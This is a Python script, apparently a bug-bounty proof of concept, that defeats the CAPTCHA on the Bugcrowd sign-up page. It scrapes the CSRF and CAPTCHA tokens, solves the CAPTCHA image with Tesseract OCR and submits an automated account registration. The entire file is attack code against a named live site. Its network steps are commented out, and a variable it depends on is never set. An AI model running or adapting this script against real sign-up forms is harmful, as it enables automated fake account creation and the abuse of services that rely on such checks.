# A script to bypass the Bugcrowd sign-up page captcha
# Created by @pwndizzle - http://pwndizzle.blogspot.com 

from PIL import Image
from urllib.error import *
from urllib.request import *
from urllib.parse import *
import re
import subprocess
import pytesseract


def getpage():
    try:
        print("[+] Downloading Page")  
        site = urlopen("https://portal.bugcrowd.com/user/sign_up")
        site_html = site.read().decode("utf-8")
        global csrf
        #Parse page for CSRF token (string 43 characters long ending with =)  
        csrf = re.findall('[a-zA-Z0-9+/]{43}=', site_html)
        print ("-----CSRF Token: " + csrf[0])
        global ctoken
        #Parse page for captcha token (string 40 characters long)   
        ctoken = re.findall('[a-z0-9]{40}', site_html)
        print ("-----Captcha Token: " + ctoken[0])
    except URLError as e:
        print ("*****Error: Cannot retrieve URL*****")

 
def getcaptcha():
    try:
        print("[+] Downloading Captcha") 
        captchaurl = "https://portal.bugcrowd.com/simple_captcha?code="+ctoken[0] 
        urlretrieve(captchaurl,'captcha1.png')
    except URLError as e:
        print ("*****Error: Cannot retrieve URL*****")


def resizer(filename):
    print("[+] Resizing...")
    im1 = Image.open(filename)
    width, height = im1.size
    im2 = im1.resize((int(width*5), int(height*5)), Image.BICUBIC)
    im2.save("captcha2.png")

 
def tesseract(filename):
    try:
        print("[+] Running Tesseract...")
        #Run Tesseract, -psm 8, tells Tesseract we are looking for a single word 
        text = pytesseract.image_to_string(Image.open(filename))

        print("-----Captcha: " + text) 
    except Exception as e:
        print ("Error: " + str(e))

  
def send():
    try:
        print("[+] Sending request...")
        user = "testuser99"
        params = {'utf8':'%E2%9C%93', 'authenticity_token': csrf[0], 'user[username]':user, 'user[email]':user+'@test.com', 'user[password]':'password123', 'user[password_confirmation]':'password123', 'captcha':cvalue,'captcha_key':ctoken[0],'agree_terms_conditions':'true'}
        data = urlencode(params).encode('utf-8')
        request = Request("https://portal.bugcrowd.com/user")
        #Send request and analyse response
        f = urlopen(request, data)
        response = f.read().decode('utf-8')
  #Check for error message
        fail = re.search('The following errors occurred', response)
        if fail:
            print("-----Account creation failed!")
        else:
            print ("-----Account created!")
    except Exception as e:
        print ("Error: " + str(e))

  
print("[+] Start!")
#Download page and parse data
#getpage()
#Download captcha image
#getcaptcha()
#Resize captcha image 
resizer('test/1.png')
#Need more filtering? Add subroutines here!
#Use Tesseract to analyse captcha image
tesseract('captcha2.png')
#Send request to site containing form data and captcha
#send()
print("[+] Finished!")
